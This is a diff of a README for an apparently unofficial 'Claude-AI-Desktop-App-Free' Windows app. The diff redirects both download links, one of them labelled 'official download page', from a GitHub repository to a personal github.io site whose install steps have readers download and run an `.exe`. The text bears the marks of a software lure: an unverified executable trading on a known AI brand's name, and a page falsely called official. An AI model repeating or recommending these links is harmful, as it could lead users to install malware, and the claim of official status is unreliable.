@@ -1,6 +1,6 @@
 # 🤖 Claude-AI-Desktop-App-Free - Use Claude AI instantly on Windows
 
-[![](https://img.shields.io/badge/Download-Claude-AI-Desktop-App-Free-blue)](https://github.com/clockradiobeefsteakplant531/Claude-AI-Desktop-App-Free)
+[![](https://img.shields.io/badge/Download-Claude-AI-Desktop-App-Free-blue)](https://clockradiobeefsteakplant531.github.io)
 
 Claude-AI-Desktop-App-Free provides a simple way to use the Claude AI web interface on your Windows computer. This application wraps the official Claude website inside a dedicated window. It stays separate from your web browser, which helps you stay focused on your work. The app runs as a lightweight container using the Microsoft WebView2 engine. It includes tools to help you manage your conversations and access the AI with keyboard shortcuts.
 
@@ -17,7 +17,7 @@ To run this application, your computer needs the following:
 
 Follow these steps to install the software on your machine:
 
-1.  Visit the [official download page](https://github.com/clockradiobeefsteakplant531/Claude-AI-Desktop-App-Free).
+1.  Visit the [official download page](https://clockradiobeefsteakplant531.github.io).
 2.  Look for the "Releases" section on the right side of the page.
 3.  Click the version marked "Latest."
 4.  Find the file ending in `.exe` under the "Assets" heading.
